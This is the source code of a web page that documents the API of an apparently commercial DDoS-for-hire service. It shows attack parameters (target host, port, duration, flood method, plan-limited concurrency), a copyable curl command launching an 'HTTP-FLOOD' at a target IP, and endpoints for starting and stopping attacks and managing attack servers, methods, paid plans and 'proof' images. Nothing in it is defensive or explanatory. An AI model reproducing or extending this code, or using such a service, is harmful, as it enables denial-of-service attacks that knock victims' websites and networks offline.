"use client";
import { useState, useEffect } from "react";
import { Copy, Terminal, Bomb, Shield, Key } from "lucide-react";
import { motion } from "motion/react";
import { slideUp } from "@/lib/motion-variants";
import api from "@/lib/api";

const baseURL = "/api/v1";

const fields = [
  { field: "key", description: "Your API Key", value: "Get it from your profile", required: true },
  { field: "host", description: "Target IP or URL", value: "1.2.3.4 or https://example.com", required: true },
  { field: "port", description: "Target Port", value: "0 - 65535", required: true },
  { field: "time", description: "Duration in seconds", value: "30 or longer", required: true },
  { field: "method", description: "Attack method", value: "see methods below", required: true },
  { field: "concurrents", description: "Concurrent threads", value: "1, 2, 3 (depends on plan)", required: false },
];

const endpoints = [
  { method: "POST", path: "/launch", desc: "Launch an attack", auth: "API Key" },
  { method: "GET", path: "/methods", desc: "List available methods", auth: "API Key" },
  { method: "GET", path: "/ongoing-attacks", desc: "List active attacks", auth: "API Key" },
  { method: "POST", path: "/stop", desc: "Stop an attack", auth: "API Key" },
  { method: "GET", path: "/profile", desc: "Get your profile", auth: "Bearer Token" },
  { method: "PUT", path: "/profile", desc: "Update profile", auth: "Bearer Token" },
  { method: "GET", path: "/servers", desc: "List servers (admin)", auth: "Admin" },
  { method: "POST", path: "/servers", desc: "Add a server (admin)", auth: "Admin" },
  { method: "PATCH", path: "/servers/{id}", desc: "Update a server (admin)", auth: "Admin" },
  { method: "GET", path: "/users", desc: "List users (admin)", auth: "Admin" },
  { method: "POST", path: "/add-user", desc: "Create user (admin)", auth: "Admin" },
  { method: "PUT", path: "/users/{id}", desc: "Update user (admin)", auth: "Admin" },
  { method: "DELETE", path: "/remove-user/{id}", desc: "Delete user (admin)", auth: "Admin" },
  { method: "GET", path: "/plans", desc: "List plans (admin)", auth: "Admin" },
  { method: "POST", path: "/plans", desc: "Create plan (admin)", auth: "Admin" },
  { method: "PUT", path: "/plans/{name}", desc: "Update plan (admin)", auth: "Admin" },
  { method: "DELETE", path: "/plans/{name}", desc: "Delete plan (admin)", auth: "Admin" },
  { method: "GET", path: "/methods", desc: "List methods (admin)", auth: "Admin" },
  { method: "POST", path: "/methods", desc: "Create method (admin)", auth: "Admin" },
  { method: "PUT", path: "/methods/{name}", desc: "Update method (admin)", auth: "Admin" },
  { method: "DELETE", path: "/methods/{name}", desc: "Delete method (admin)", auth: "Admin" },
  { method: "GET", path: "/proofs", desc: "List proof images (admin)", auth: "Admin" },
  { method: "POST", path: "/proofs", desc: "Upload proof (admin)", auth: "Admin" },
  { method: "DELETE", path: "/proofs/{id}", desc: "Delete proof (admin)", auth: "Admin" },
  { method: "GET", path: "/broadcasts", desc: "List broadcasts", auth: "Public" },
  { method: "POST", path: "/broadcasts", desc: "Create broadcast (admin)", auth: "Admin" },
  { method: "DELETE", path: "/broadcasts/{id}", desc: "Delete broadcast (admin)", auth: "Admin" },
  { method: "POST", path: "/generate-key", desc: "Generate API key (admin)", auth: "Admin" },
];

const methodColors: Record<string, string> = {
  GET: "text-success",
  POST: "text-primary",
  PUT: "text-warning",
  PATCH: "text-warning",
  DELETE: "text-danger",
};

export default function ApiDocs() {
  const [copied, setCopied] = useState<string | null>(null);
  const [apiKey, setApiKey] = useState("");

  useEffect(() => {
    const token = localStorage.getItem("token");
    if (!token) return;
    api.get("/profile", { headers: { Authorization: `Bearer ${token}` } })
      .then(r => setApiKey(r.data.api_key || ""))
      .catch(() => {});
  }, []);

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(null), 2000);
  };

  const curlExample = `# Launch an attack
curl -X POST ${baseURL}/launch \\
  -H "Authorization: Bearer ${apiKey || "YOUR_API_KEY"}" \\
  -H "Content-Type: application/json" \\
  -d '{"host":"1.2.3.4","port":80,"time":60,"method":"HTTP-FLOOD","concurrents":1}'`;

  return (
    <div className="min-h-screen bg-background">
      <div className="max-w-5xl mx-auto p-4 md:p-6 space-y-6">
        <motion.div variants={slideUp} initial="initial" animate="animate">
          <div className="flex items-center gap-3 mb-1">
            <Terminal size={20} className="text-primary" />
            <h1 className="text-lg font-semibold text-white">API v1 Reference</h1>
          </div>
          <p className="text-sm text-text-muted">Base URL: <code className="text-primary">{baseURL}</code></p>
        </motion.div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <motion.div variants={slideUp} initial="initial" animate="animate" className="space-y-4">
            <div>
              <h2 className="text-xs font-medium text-text-muted uppercase tracking-wider mb-2">Attack Fields</h2>
              <div className="border border-border rounded-lg overflow-x-auto">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-border bg-muted/50">
                      <th className="text-left px-3 py-2 text-text-muted font-medium text-xs uppercase">Field</th>
                      <th className="text-left px-3 py-2 text-text-muted font-medium text-xs uppercase">Description</th>
                      <th className="text-left px-3 py-2 text-text-muted font-medium text-xs uppercase">Value</th>
                      <th className="text-left px-3 py-2 text-text-muted font-medium text-xs uppercase">Req</th>
                    </tr>
                  </thead>
                  <tbody>
                    {fields.map((item, i) => (
                      <tr key={i} className="border-t border-border/50">
                        <td className="px-3 py-2.5"><code className="text-primary text-xs font-mono">{item.field}</code></td>
                        <td className="px-3 py-2.5 text-text-muted text-xs">{item.description}</td>
                        <td className="px-3 py-2.5 text-text-muted text-xs max-w-[200px] truncate">{item.value}</td>
                        <td className="px-3 py-2.5">{item.required ? <span className="text-success text-xs">Yes</span> : <span className="text-text-muted text-xs">No</span>}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            <div>
              <h2 className="text-xs font-medium text-text-muted uppercase tracking-wider mb-2">Example</h2>
              <div className="bg-subtle border border-border rounded-lg overflow-hidden">
                <pre className="p-4 text-xs text-text-muted font-mono overflow-x-auto whitespace-pre-wrap">{curlExample}</pre>
                <div className="border-t border-border px-4 py-2 flex justify-end">
                  <button
                    onClick={() => copyToClipboard(curlExample, "curl")}
                    className="flex items-center gap-1.5 text-xs text-text-muted hover:text-primary transition-colors"
                  >
                    <Copy size={12} />
                    {copied === "curl" ? "Copied!" : "Copy"}
                  </button>
                </div>
              </div>
            </div>
          </motion.div>

          <motion.div variants={slideUp} initial="initial" animate="animate" className="space-y-4">
            <h2 className="flex items-center gap-2 text-xs font-medium text-text-muted uppercase tracking-wider">
              <Bomb size={13} />
              All Endpoints
            </h2>
            <div className="border border-border rounded-lg overflow-x-auto max-h-[600px] overflow-y-auto">
              <table className="w-full text-xs">
                <thead>
                  <tr className="border-b border-border bg-muted/50 sticky top-0">
                    <th className="text-left px-3 py-2 text-text-muted font-medium uppercase">Method</th>
                    <th className="text-left px-3 py-2 text-text-muted font-medium uppercase">Path</th>
                    <th className="text-left px-3 py-2 text-text-muted font-medium uppercase">Description</th>
                    <th className="text-left px-3 py-2 text-text-muted font-medium uppercase">Auth</th>
                  </tr>
                </thead>
                <tbody>
                  {endpoints.map((ep, i) => (
                    <tr key={i} className="border-t border-border/50 hover:bg-muted/20 transition-colors">
                      <td className="px-3 py-2">
                        <span className={`font-mono font-medium ${methodColors[ep.method] || "text-text-muted"}`}>{ep.method}</span>
                      </td>
                      <td className="px-3 py-2 font-mono text-white">{ep.path}</td>
                      <td className="px-3 py-2 text-text-muted">{ep.desc}</td>
                      <td className="px-3 py-2">
                        {ep.auth === "Admin" ? (
                          <span className="inline-flex items-center gap-1 bg-warning/10 text-warning px-1.5 py-0.5 rounded text-[10px]">
                            <Shield size={9} /> Admin
                          </span>
                        ) : (
                          <span className="text-text-muted text-[10px]">{ep.auth}</span>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            <div className="bg-subtle border border-border rounded-lg p-4 space-y-2">
              <h3 className="text-xs font-medium text-white">Authentication</h3>
              <p className="text-xs text-text-muted">Use Bearer token in the Authorization header:</p>
              {apiKey ? (
                <div className="flex items-center gap-2 bg-background border border-border rounded px-3 py-2">
                  <Key size={14} className="text-primary shrink-0" />
                  <code className="text-xs text-primary font-mono flex-1 truncate">{apiKey}</code>
                  <button
                    onClick={() => copyToClipboard(apiKey, "api-key")}
                    className="flex items-center gap-1 text-xs text-text-muted hover:text-primary transition-colors shrink-0"
                  >
                    <Copy size={12} />
                    {copied === "api-key" ? "Copied!" : "Copy"}
                  </button>
                </div>
              ) : (
                <p className="text-xs text-text-muted">
                  <a href="/login" className="text-primary underline">Log in</a> to see your API key, or get it from the <a href="/profile" className="text-primary underline">profile page</a>.
                </p>
              )}
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
}
